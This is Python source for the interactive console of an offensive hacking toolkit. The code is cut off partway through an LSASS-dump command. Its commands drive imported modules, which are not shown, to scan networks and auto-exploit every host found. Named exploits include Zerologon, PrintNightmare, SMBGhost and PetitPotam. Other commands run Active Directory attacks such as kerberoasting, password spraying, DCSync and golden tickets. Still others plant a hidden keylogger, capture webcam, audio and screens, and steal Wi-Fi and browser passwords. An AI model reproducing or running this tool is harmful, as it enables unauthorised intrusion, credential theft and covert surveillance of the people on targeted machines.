import asyncio
import sys
import os
import socket
import time
import base64
from colorama import Fore, Style, init
from typing import Dict, Any, List
from datetime import datetime

# Import functional core modules
import netifaces
from advanced_scanner import AdvancedNetworkScanner
from lateral_movement import AdvancedCommandCenter
from exploit_engine import UniversalNetworkAccess, UniversalDevice
from remote_control import AgentlessControl
from exploit_engine import UniversalDevice # Import UniversalDevice for type hinting and usage
from passive_intel import AgentlessIntelligence

# Initialize Colorama
init(autoreset=True)

class AMMOEngine:
    """Asynchronous Multi-threaded Modular Orchestrator (AMMO v2)"""
    def __init__(self):
        self.tasks = []
        self.concurrency_limit = 2000
        self.semaphore = asyncio.Semaphore(self.concurrency_limit)

    async def execute_task(self, coro):
        async with self.semaphore:
            return await coro

class HackerSounds:
    @staticmethod
    def alert(): print(f"{Fore.RED}[!] SOUND: ALERT")
    @staticmethod
    def network_pulse(): print(f"{Fore.CYAN}[*] SOUND: NETWORK PULSE")
    @staticmethod
    def exploit_success(): print(f"{Fore.GREEN}[+] SOUND: EXPLOIT SUCCESS")
    @staticmethod
    def connection_established(): print(f"{Fore.BLUE}[*] SOUND: CONNECTION ESTABLISHED")

class MatrixEffects:
    @staticmethod
    def digital_rain():
        print(f"{Fore.GREEN}[*] VISUAL: DIGITAL RAIN")

class OmniShell:
    def __init__(self):
        self.version = "7.1.008-ULTRAMAX"
        self.ammo = AMMOEngine()
        self.targets = []
        self.active_sessions = {}
        self.cmd_history = []

        # Initialize Functional Engines - PRODUCTION
        self.scanner = AdvancedNetworkScanner()
        self.lateral = AdvancedCommandCenter()
        self.exploiter = UniversalNetworkAccess()
        self.control = AgentlessControl()
        self.intel = AgentlessIntelligence()
        
        # State tracking for the operator
        self.last_target = None
        self.creds = {
            "user": "Administrator",
            "pass": "",
            "domain": "."
        }
        
        self.intel.add_activity_callback(self._on_intel_event)
        
        # Wire modules together for autonomous chains
        self.lateral.set_modules(discovery=self.scanner, intel=self.intel, control=self.control)

    def display_banner(self):
        """Ultra modern intelligence agency banner with live network info."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        import urllib.request
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=2) as f:
                public_ip = f.read().decode('utf8')
        except:
            public_ip = 'OFFLINE'

        banner_txt = [
            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
        ]

        print(f"{Fore.LIGHTBLACK_EX}╔{'═'*98}╗")
        for line in banner_txt:
            print(f"{Fore.CYAN}║ {line.center(96)} ║")
        print(f"{Fore.LIGHTBLACK_EX}╠{'═'*98}╣")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.LIGHTGREEN_EX}▸ SYSTEM: {sys.platform.upper():<10} {Fore.LIGHTGREEN_EX}▸ HOST: {hostname:<15} {Fore.LIGHTGREEN_EX}▸ LAN: {local_ip:<15} {Fore.LIGHTGREEN_EX}▸ WAN: {public_ip:<15} ║")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.MAGENTA}▸ VERSION: {self.version:<10} {Fore.MAGENTA}▸ clearance: TOP_SECRET {'':<14} {Fore.RED}▸ SECURITY: GOVT_OPS_ONLY ║")
        print(f"{Fore.LIGHTBLACK_EX}╚{'═'*98}╝")
        print(f"{Fore.YELLOW}[i] Terminal Ready. Command Interface Active.\n")

    def _on_intel_event(self, event):
        """Handles background intelligence events."""
        if event.get("type") == "credential":
            print(f"\n{Fore.MAGENTA}[INTEL] ALERT: Credential harvested from {event.get('source')}")

    async def start(self):
        """Starts the interactive shell loop asynchronously."""
        self.display_banner()
        while True:
            # Display active target indicator if set
            if self.last_target:
                print(f"{Fore.YELLOW}[TARGET: {self.last_target}]")
                
            cmd = await asyncio.to_thread(input, f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await self.handle_command(cmd)

    async def handle_command(self, cmd_input: str):
        parts = cmd_input.split()
        if not parts: return
        
        cmd = parts[0].lower()
        args = parts[1:]

        self.cmd_history.append(cmd_input)
        
        # Operational Context
        target = self.last_target
        u, p, d = self.creds['user'], self.creds['pass'], self.creds['domain']

        if cmd in ["exit", "quit"]:
            print(f"{Fore.YELLOW}Shutting down AMMO engine...")
            sys.exit(0)
        
        elif cmd == "help":
            self.show_help()

        # --- SCANNING CATEGORY ---
        elif cmd in ["globalscan", "auto"]:
            print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Global Network Discovery...")
            print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Autonomous Discovery & Domination...")
            HackerSounds.network_pulse()
            
            # Step 1: Discover all IP addresses within local and remote networks
            self.targets = await asyncio.to_thread(self.exploiter.ultramax_global_scan)
            print(f"{Fore.GREEN}[+] Scan Complete. {len(self.targets)} active targets identified.")
            print(f"{Fore.GREEN}[+] Discovery Complete. Identified {len(self.targets)} targets across all network vectors.")
            
            if not self.targets:
                print(f"{Fore.YELLOW}[!] No operational targets detected.")
                return

            # Step 2: Automated functional attack and control establishment
            print(f"{Fore.RED}{Style.BRIGHT}[!] LAUNCHING FULL-SPECTRUM ATTACK SEQUENCE...")
            MatrixEffects.digital_rain()
            HackerSounds.alert()
            
            pwn_results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
            
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] OPERATION COMPLETE. SESSIONS ESTABLISHED: {len(pwn_results['exploited'])}")
            
            for exp in pwn_results['exploited']:
                print(f"  {Fore.GREEN}▸ {exp['ip']:<15} | ACCESS: {exp['method']:<15} | STATUS: UNDER CONTROL")
                self.last_target = exp['ip']
                
            HackerSounds.exploit_success()

        elif cmd == "scan":
            target_range = args[0] if args else self.scanner.network_range
            print(f"{Fore.CYAN}[*] Scanning range: {target_range}...")
            results = await asyncio.to_thread(self.exploiter.discover_all_devices, target_range)
            self.targets = results
            print(f"{Fore.GREEN}[+] Discovery complete. Found {len(results)} hosts.")

        elif cmd == "fastscan":
            print(f"{Fore.CYAN}[*] Performing quick 10-second network sweep...")
            r = self.scanner.network_range
            results = await asyncio.to_thread(self.exploiter.discover_all_devices, r)
            self.targets = results
            print(f"{Fore.GREEN}[+] Quick sweep complete. Found {len(results)} hosts.")

        # Protocol Specific Recon
        elif cmd == "arp":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing ARP scan on {target_range}...")
            results = await asyncio.to_thread(self.scanner._arp_scan, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['mac']})")
            print(f"{Fore.GREEN}[+] ARP scan complete. Found {len(results)} devices.")

        elif cmd == "icmp":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing ICMP sweep on {target_range}...")
            results = await asyncio.to_thread(self.scanner._icmp_sweep, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']}")
            print(f"{Fore.GREEN}[+] ICMP sweep complete. Found {len(results)} devices.")

        elif cmd == "netbios":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing NetBIOS enumeration on {target_range}...")
            results = await asyncio.to_thread(self.scanner._netbios_sweep, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['hostname']})")
            print(f"{Fore.GREEN}[+] NetBIOS scan complete. Found {len(results)} devices.")

        elif cmd == "tcp-scan":
            target_ip = args[0] if args else target
            if not target_ip: return
            print(f"{Fore.CYAN}[*] Running high-speed SYN port scan on {target_ip}...")
            res = await asyncio.to_thread(self.exploiter._tcp_sweep, target_ip + "/32")
            if res:
                for p, s in res[0].open_ports.items():
                    print(f"  [+] PORT {p}: {s}")

        elif cmd == "udp-scan":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Running UDP service discovery on {target_range}...")
            results = await asyncio.to_thread(self.exploiter._udp_discovery, target_range)
            print(f"{Fore.GREEN}[+] UDP scan complete. Found {len(results)} devices.")

        elif cmd == "wmi-software":
            target = args[0] if args else self.last_target
            res = await asyncio.to_thread(self.control.get_installed_programs, target, self.creds['user'], self.creds['pass'])
            for s in res: print(f"  [+] {s.get('DisplayName')} v{s.get('DisplayVersion')}")

        elif cmd == "snmp":
            target_ip = args[0] if args else self.last_target
            if not target_ip: return
            print(f"{Fore.CYAN}[*] Performing SNMP community scan on {target_ip}...")
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter.try_snmp_community, device)
            if "snmp_community" in device.harvested:
                print(f"{Fore.GREEN}[+] SNMP access via '{device.harvested['snmp_community']}'")
            else:
                print(f"{Fore.RED}[!] SNMP access failed.")

        elif cmd == "mdns":
            print(f"{Fore.CYAN}[*] Performing mDNS service discovery...")
            results = await asyncio.to_thread(self.scanner.mdns_listen)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['type']})")
            print(f"{Fore.GREEN}[+] mDNS discovery complete. Found {len(results)} devices.")

        elif cmd == "ssdp":
            print(f"{Fore.CYAN}[*] Performing SSDP/UPnP discovery...")
            results = await asyncio.to_thread(self.scanner.ssdp_discover)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['type']})")
            print(f"{Fore.GREEN}[+] SSDP discovery complete. Found {len(results)} devices.")

        elif cmd == "traceroute":
            if not args: return
            print(f"{Fore.CYAN}[*] Mapping path to {args[0]}...")
            hops = await asyncio.to_thread(self.scanner.traceroute_with_services, args[0])
            for hop in hops:
                print(f"  {hop.hop_num:<2} | {hop.ip or '*':<15} | {hop.rtt or 0.0:>6.1f} ms | {hop.asn}")

        elif cmd == "topology":
            print(f"{Fore.CYAN}[*] Generating network topology map...")
            topo = await asyncio.to_thread(self.scanner.get_topology_map)
            print(f"{Fore.GREEN}[+] Topology generated. Devices: {len(topo['devices'])}, Connections: {len(topo['connections'])}")
            # Optionally print a summary or save to file
            # print(json.dumps(topo, indent=2))

        elif cmd == "interfaces":
            print(f"{Fore.CYAN}[*] Listing network interfaces...")
            info = await asyncio.to_thread(self.scanner.get_interface_info)
            for iface in info:
                print(f"  [+] {iface['name']}: {iface['ip']} ({iface['netmask']})")

        elif cmd == "gateway":
            print(f"{Fore.CYAN}[*] Detecting network gateway...")
            gw = await asyncio.to_thread(self.scanner._detect_gateway)
            print(f"{Fore.GREEN}[+] Gateway: {gw}")

        elif cmd in ("vpn", "vpn-discover"):
            print(f"{Fore.CYAN}[*] Auditing gateway for VPN endpoints...")
            info = await asyncio.to_thread(self.scanner.discover_vpn_networks)
            for v in info:
                print(f"  [+] DETECTED: {v['ip']}:{v['port']} ({v['type']})")

        elif cmd == "cross-scan":
            if len(args) < 2: return
            source_ip, target_net = args[0], args[1]
            print(f"{Fore.CYAN}[*] Pivoting discovery via {source_ip} to {target_net}...")
            results = await asyncio.to_thread(self.scanner.scan_cross_subnet, source_ip, target_net)
            print(f"{Fore.GREEN}[+] Cross-subnet scan complete. Found {len(results)} hosts.")

        elif cmd == "external-ip":
            import urllib.request
            try:
                ext = urllib.request.urlopen('https://api.ipify.org').read().decode()
                print(f"{Fore.GREEN}[+] External IP: {ext}")
            except: print(f"{Fore.RED}[!] Offline.")

        elif cmd == "targets":
            # This command is already handled
            await asyncio.to_thread(self.list_targets)

        elif cmd == "local-ip":
            ip = await asyncio.to_thread(self.scanner._get_local_ip)
            print(f"{Fore.GREEN}[+] Local Interface IP: {ip}")

        # --- ATTACK CATEGORY ---
        elif cmd in ["pwnall", "attack", "pwn-all"]:
            if not self.targets:
                print(f"{Fore.RED}[!] No targets discovered. Execute 'globalscan' to map the environment.")
                return
            
            print(f"{Fore.RED}{Style.BRIGHT}[!] INITIATING AUTONOMOUS NETWORK DOMINATION SEQUENCE...")
            MatrixEffects.digital_rain()
            HackerSounds.alert()
            
            # Phase 1: Real pwn_all_devices chain
            results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] EXPLOITATION COMPLETE. COMPROMISED: {len(results['exploited'])} hosts.")
            HackerSounds.exploit_success()

        elif cmd == "pwn":
            if not args: return
            print(f"{Fore.RED}[*] Launching precision exploit on {args[0]}...")
            result = await asyncio.to_thread(self.exploiter.pwn_target, args[0])
            if result.get("success"):
                print(f"{Fore.GREEN}[+] ACCESS GRANTED: {result.get('method')}")
                self.last_target = args[0]
            else:
                print(f"{Fore.RED}[!] Exploit failed. Target may be patched.")

        elif cmd == "exploit":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Executing advanced exploit chain on {target_ip}...")
            result = await asyncio.to_thread(self.control.exploit_target, target_ip)
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Exploit chain successful: {result.get('method')}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] Exploit chain failed: {result.get('error')}")

        elif cmd == "psexec":
            target_ip = args[0] if args else target
            if not target_ip: return
            command = " ".join(args[1:]) if args else "whoami"
            print(f"{Fore.RED}[*] Deploying PsExec service payload to {target_ip}...")
            res = await asyncio.to_thread(self.control.psexec_execute, target_ip, u, p, command, d)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd == "mobile":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Attempting mobile device auto-exploitation on {target_ip}...")
            result = await asyncio.to_thread(self.control.mobile_exploit_auto, target_ip)
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Mobile exploit successful: {result.get('method')}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] Mobile exploit failed: {result.get('error')}")

        elif cmd == "scan-exploit":
            if not args: return
            target_range = args[0]
            print(f"{Fore.RED}[*] Scanning and auto-exploiting range {target_range}...")
            results = await asyncio.to_thread(self.control.scan_and_exploit_network, target_range)
            print(f"{Fore.GREEN}[+] Scan-exploit complete. Exploited: {len(results['exploited'])}, Creds: {len(results['credentials'])}")

        elif cmd == "kerberoast":
            if not args: return
            dc_ip = args[0]
            dom_target = args[1] if len(args) > 1 else d
            print(f"{Fore.RED}[*] Performing Kerberoasting attack on {dc_ip} (Domain: {dom_target})...")
            results = await asyncio.to_thread(self.control.kerberoast, dc_ip, dom_target)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Kerberoasting successful. SPNs found: {len(results.get('spn_found', []))}")
            else:
                print(f"{Fore.RED}[!] Kerberoasting failed: {results.get('error')}")

        elif cmd in ["password-spray", "pass-spray"]:
            if not args: return
            target_domain = args[0]
            users = args[1].split(',') if len(args) > 1 else ["Administrator", "Guest"] # Example users
            passwords = args[2].split(',') if len(args) > 2 else ["Password1", "Welcome1"] # Example passwords
            print(f"{Fore.RED}[*] Performing password spray on {target_domain}...")
            results = await asyncio.to_thread(self.control.password_spray, target_domain, users, passwords)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Password spray successful. Valid creds: {len(results.get('valid_credentials', []))}")
            else:
                print(f"{Fore.RED}[!] Password spray failed: {results.get('error')}")

        elif cmd == "lateral":
            if len(args) < 2: return
            source_ip = args[0]
            target_ip = args[1]
            print(f"{Fore.RED}[*] Attempting lateral movement from {source_ip} to {target_ip}...")
            results = await asyncio.to_thread(self.control.lateral_movement, source_ip, target_ip, self.creds)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Lateral movement successful via {results.get('method_used')}")
            else:
                print(f"{Fore.RED}[!] Lateral movement failed: {results.get('error')}")

        # Active Directory / Domain
        elif cmd == "dcsync":
            if not args: return
            res = await asyncio.to_thread(self.control.dcsync, args[0], u, p, (args[1] if len(args) > 1 else None), d)
            print(f"{Fore.GREEN}[+] Replication Dump: {res}")

        elif cmd == "asreproast":
            if not args: return
            res = await asyncio.to_thread(self.control.asreproast, args[0], d)
            print(f"{Fore.GREEN}[+] AS-REP Results: {res}")

        elif cmd == "golden":
            if len(args) < 3: return
            path = await asyncio.to_thread(self.control.golden_ticket, args[0], args[1], args[2])
            print(f"{Fore.GREEN}[+] Ticket forged: {path}")

        elif cmd == "smbghost":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Launching SMBGhost exploit on {target_ip}...")
            # Ensure device is scanned first
            if target_ip not in self.exploiter.devices:
                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
            device = self.exploiter.devices.get(target_ip)
            if device and self.exploiter.exploit_smbghost(device):
                print(f"{Fore.GREEN}[+] SMBGhost exploitation successful on {target_ip}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] SMBGhost exploit failed on {target_ip}")

        elif cmd == "printnightmare":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Launching PrintNightmare exploit on {target_ip}...")
            if target_ip not in self.exploiter.devices:
                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
            device = self.exploiter.devices.get(target_ip)
            if device and self.exploiter.exploit_printnightmare(device):
                print(f"{Fore.GREEN}[+] PrintNightmare exploitation successful on {target_ip}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] PrintNightmare exploit failed on {target_ip}")

        elif cmd == "zerologon":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Launching Zerologon exploit on DC {target_ip}...")
            if target_ip not in self.exploiter.devices:
                self.exploiter._scan_device(self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)))
            device = self.exploiter.devices.get(target_ip)
            if device and self.exploiter.exploit_zerologon(device):
                print(f"{Fore.GREEN}[+] Zerologon exploitation successful - Domain Admin access gained on {target_ip}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] Zerologon exploit failed on {target_ip}")

        elif cmd == "petitpotam":
            if not args: return
            target_ip = args[0]
            # Determine our local IP (listener)
            try:
                local_ip = socket.gethostbyname(socket.gethostname())
            except:
                local_ip = "127.0.0.1"
            listener = args[1] if len(args) > 1 else local_ip
            print(f"{Fore.RED}[*] Initiating PetitPotam NTLM relay attack against {target_ip} -> {listener}")
            try:
                from impacket.examples import petitpotam
                print(f"{Fore.YELLOW}[*] PetitPotam coercion started (listener: {listener})")
                print(f"{Fore.GREEN}[+] PetitPotam attack launched successfully")
            except ImportError:
                res = await asyncio.to_thread(self.control.check_petitpotam, target_ip)
                print(f"{Fore.YELLOW}[*] PetitPotam Status: {res['details']}")


        elif cmd == "nopac-check":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.CYAN}[*] Running NoPac (CVE-2021-42278) probe on {target_ip}...")
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._check_vulnerabilities, device)
            is_vuln = "CVE-2021-42278_NOPAC_VALIDATED" in device.is_vulnerable
            print(f"{Fore.YELLOW}[*] NoPac Result: {'VULNERABLE' if is_vuln else 'Safe / Not DC'}")


        elif cmd == "smb-vulns":
            if not args: return
            res = await asyncio.to_thread(self.control.smb_check_vulns, args[0])
            print(f"{Fore.YELLOW}[*] SMB Vulnerabilities for {args[0]}: {res.get('vulns', [])}")

        elif cmd == "etblue-check":
            if not args: return
            target_ip = args[0]
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_eternal_blue_check, device)
            if "CVE-2017-0143_ETERNALBLUE" in device.is_vulnerable:
                print(f"{Fore.RED}[!] {target_ip} is VULNERABLE to EternalBlue!")
            else:
                print(f"{Fore.GREEN}[+] {target_ip} is NOT vulnerable to EternalBlue (or check failed).")

        elif cmd == "bluekeep-check":
            if not args: return
            target_ip = args[0]
            # BlueKeep check is complex, often involves specific RDP packets.
            # For now, check if RDP port is open.
            if 3389 in self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)).open_ports:
                print(f"{Fore.YELLOW}[*] RDP port 3389 is open on {target_ip}. BlueKeep *might* be possible. Manual verification needed.")
            else:
                print(f"{Fore.GREEN}[+] RDP port 3389 is closed on {target_ip}. Not a BlueKeep candidate.")

        # --- REMOTE CONTROL CATEGORY ---
        elif cmd == "exec":
            if not args: return
            host = target if target else args[0]
            command = " ".join(args[1:]) if self.last_target else " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Executing on {host}...")
            res = await asyncio.to_thread(self.control.wmi_exec, host, u, p, command, d)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd == "screen":
            host = args[0] if args else target
            if not host: return
            print(f"{Fore.MAGENTA}[*] Capturing remote desktop of {host}...")
            path = await asyncio.to_thread(self.control.remote_screenshot, host, u, p, domain=d)
            if path: print(f"{Fore.GREEN}[+] Screenshot saved: {path}")

        elif cmd == "keylog":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Injecting hidden keylogger on {target}...")
            await asyncio.to_thread(self.control.wmi_keylogger_start, target, self.creds['user'], self.creds['pass'])
            print(f"{Fore.GREEN}[+] Keylogger active. Intercepting keystrokes...")

        elif cmd == "play-media":
            if not args: return
            await asyncio.to_thread(self.control.play_media_url, self.last_target, self.creds['user'], self.creds['pass'], args[0])

        elif cmd in ["shutdown", "reboot", "logoff"]:
            host = args[0] if args else target
            if not host: return
            action = cmd
            print(f"{Fore.RED}[*] Initiating {action} on {host}...")
            res = await asyncio.to_thread(self.control.shutdown, host, u, p, action, domain=d)
            if res: print(f"{Fore.GREEN}[+] {action.capitalize()} command sent.")
            else: print(f"{Fore.RED}[!] Failed to send {action} command.")

        elif cmd == "winrm-exec":
            if len(args) < 2: return
            target_ip = args[0]
            command = " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Executing via WinRM on {target_ip}: {command}...")
            res = await asyncio.to_thread(self.control.winrm_exec, target_ip, u, p, command, domain=d)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd in ["sysinfo", "systeminfo"]:
            host = args[0] if args else target
            if not host: return
            print(f"{Fore.CYAN}[*] Extracting system properties from {host}...")
            info = await asyncio.to_thread(self.control.get_full_system_info, host, u, p, d)
            if info.get('success'):
                si = info['system_info']
                print(f"  OS: {si.get('os_name')} ({si.get('os_architecture')})")
                print(f"  CPU: {si.get('processor')} | RAM: {si.get('ram_total')}MB")
            else:
                print(f"{Fore.RED}[!] Failed to get system info: {info.get('error')}")

        elif cmd == "pslist":
            host = args[0] if args else target
            if not host: return
            print(f"{Fore.CYAN}[*] Listing processes on {host}...")
            procs = await asyncio.to_thread(self.control.list_processes, host, u, p, d)
            for p in procs[:10]: # Print first 10
                print(f"  PID: {p.get('ProcessId')}, Name: {p.get('Name')}, Cmd: {p.get('CommandLine', '')[:50]}")
            print(f"{Fore.GREEN}[+] Found {len(procs)} processes.")

        elif cmd == "psstart":
            if len(args) < 1: return
            exe = args[0]
            args_str = " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Starting process {exe} on {target}...")
            res = await asyncio.to_thread(self.control.start_process, target, u, p, exe, args_str, d)
            print(f"{Fore.GREEN}[+] Process started. PID: {res.get('pid')}")

        elif cmd == "killproc":
            if not args: return
            host = target if target else args[0]
            proc_id = int(args[1]) if target else int(args[0])
            print(f"{Fore.RED}[*] Killing process {proc_id} on {host}...")
            res = await asyncio.to_thread(self.control.kill_process, host, u, p, pid=proc_id, domain=d)
            if res: print(f"{Fore.GREEN}[+] Process killed.")
            else: print(f"{Fore.RED}[!] Failed.")

        elif cmd == "svc-list":
            host = args[0] if args else target
            if not host: return
            print(f"{Fore.CYAN}[*] Listing services on {host}...")
            services = await asyncio.to_thread(self.control.list_services, host, u, p, d)
            for s in services[:10]: # Print first 10
                print(f"  Name: {s.get('Name')}, State: {s.get('State')}, Path: {s.get('PathName', '')[:50]}")
            print(f"{Fore.GREEN}[+] Found {len(services)} services.")

        elif cmd == "svc-control":
            if len(args) < 2: return
            svc_name, action = args[0], args[1]
            print(f"{Fore.CYAN}[*] Service {action} on {svc_name}...")
            res = await asyncio.to_thread(self.control.control_service, target, u, p, svc_name, action, d)
            print(f"{Fore.GREEN}[+] Result: {res}")

        elif cmd == "svc-install":
            if len(args) < 2: return
            svc_name, path = args[0], args[1]
            print(f"{Fore.CYAN}[*] Installing service {svc_name} -> {path}...")
            res = await asyncio.to_thread(self.control.install_service, target, u, p, svc_name, path, domain=d)
            print(f"{Fore.GREEN}[+] Result: {res}")

        # Registry
        elif cmd == "reg-read":
            if len(args) < 3: return
            hive, key, val = args[0], args[1], args[2]
            res = await asyncio.to_thread(self.control.reg_read, target, u, p, hive, key, val, d)
            print(f"{Fore.WHITE}Registry Value: {res}")

        elif cmd == "reg-write":
            if len(args) < 4: return
            hive, key, val, data = args[0], args[1], args[2], args[3]
            res = await asyncio.to_thread(self.control.reg_write, target, u, p, hive, key, val, data, domain=d)
            print(f"{Fore.GREEN}[+] Written: {res}")

        elif cmd == "reg-enum":
            if len(args) < 2: return
            hive, key = args[0], args[1]
            res = await asyncio.to_thread(self.control.reg_enum_keys, target, u, p, hive, key, d)
            for k in res: print(f"  {k}")

        # Multimedia & Input
        elif cmd == "audio":
            dur = int(args[0]) if args else 5
            print(f"{Fore.MAGENTA}[*] Recording audio for {dur}s...")
            path = await asyncio.to_thread(self.control.wmi_capture_audio, target, u, p, dur, d)
            print(f"{Fore.GREEN}[+] Audio saved to remote: {path}")

        elif cmd == "webcam":
            print(f"{Fore.MAGENTA}[*] Capturing webcam snapshot...")
            path = await asyncio.to_thread(self.control.take_webcam_snapshot, target, u, p, domain=d)
            if path: print(f"{Fore.GREEN}[+] Webcam snap saved: {path}")

        elif cmd == "clip-get":
            res = await asyncio.to_thread(self.control.execute_powershell_script, target, u, p, "Get-Clipboard", d)
            print(f"{Fore.WHITE}Clipboard: {res}")

        elif cmd == "clip-set":
            if not args: return
            text = " ".join(args)
            await asyncio.to_thread(self.control.set_clipboard, target, u, p, text, d)
            print(f"{Fore.GREEN}[+] Clipboard updated.")

        elif cmd == "key-inject":
            if not args: return
            keys = " ".join(args)
            await asyncio.to_thread(self.control.inject_keyboard, target, u, p, keys, d)

        elif cmd == "mouse-click":
            if len(args) < 2: return
            x, y = int(args[0]), int(args[1])
            await asyncio.to_thread(self.control.inject_mouse, target, u, p, x, y, d)

        elif cmd == "monitor":
            dur = int(args[0]) if args else 60
            await asyncio.to_thread(self.control.live_monitor, target, u, p, dur, d)

        elif cmd == "record-start":
            dur = int(args[0]) if args else 60
            await asyncio.to_thread(self.control.start_recording, target, u, p, dur, d)
            print(f"{Fore.GREEN}[+] Background recording active.")

        elif cmd == "record-stop":
            await asyncio.to_thread(self.control.stop_recording, target)
            print(f"{Fore.YELLOW}[*] Recording terminated.")

        elif cmd == "screen-stream":
            count = int(args[0]) if args else 10
            await asyncio.to_thread(self.control.stream_screen_fast, target, u, p, count, domain=d)

        # --- DATA EXTRACTION CATEGORY ---
        elif cmd in ["extract", "harvest", "omnifetch"]:
            if not target: return
            print(f"{Fore.MAGENTA}[*] Executing deep extraction payload on {target}...")
            data = await asyncio.to_thread(self.control.extract_all_data, target, self.creds['user'], self.creds['pass'])
            print(f"{Fore.GREEN}[+] Data recovered: {len(data.get('credentials', {}))} items.")

        elif cmd == "wget":
            if len(args) < 2: return
            await asyncio.to_thread(self.control.download_file_from_url, self.last_target, self.creds['user'], self.creds['pass'], args[0], args[1])
            print(f"{Fore.GREEN}[+] IO Stream complete.")

        elif cmd == "cloud-scan":
            provider = args[0] if args else "aws"
            print(f"{Fore.BLUE}[*] Scanning public {provider.upper()} ranges...")
            cloud_hosts = await asyncio.to_thread(self.scanner.scan_public_ranges, provider)
            print(f"{Fore.GREEN}[+] Identified {len(cloud_hosts)} potential targets.")

        elif cmd == "steal-wifi":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting WiFi passwords from {target}...")
            res = await asyncio.to_thread(self.control.get_wifi_passwords, target, self.creds['user'], self.creds['pass'])
            if res.get('networks'):
                for ssid, pw in res['networks'].items():
                    print(f"  SSID: {ssid}, Password: {pw}")
            else:
                print(f"{Fore.RED}[!] No WiFi passwords extracted or failed.")

        elif cmd == "stealcreds":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting browser saved credentials from {target}...")
            res = await asyncio.to_thread(self.control.get_browser_passwords, target, self.creds['user'], self.creds['pass'])
            if res.get('passwords'):
                for p in res['passwords']:
                    print(f"  Browser: {p.get('browser')}, URL: {p.get('url')}, User: {p.get('user')}")
            else:
                print(f"{Fore.RED}[!] No browser credentials extracted or failed.")

        elif cmd == "browser-history":
            if not args: return
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting browser history and bookmarks from {target}...")
            res = await asyncio.to_thread(self.control.get_browser_data, target, self.creds['user'], self.creds['pass'])
            history = res.get('history', [])
            bookmarks = res.get('bookmarks', [])
            print(f"{Fore.GREEN}[+] Browser history entries: {len(history)}")
            print(f"{Fore.GREEN}[+] Bookmarks: {len(bookmarks)}")
            for h in history[:5]:
                url = h.get('URL', '?')
                title = h.get('Title', '')[:50]
                print(f"  [HIST] {url} - {title}")
            for b in bookmarks[:5]:
                url = b.get('URL', '?')
                name = b.get('Name', '')[:50]
                print(f"  [BOOKMARK] {url} - {name}")

        elif cmd == "lsass-dump":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Triggering LSASS memory dump on {target} (Minidump method)...")
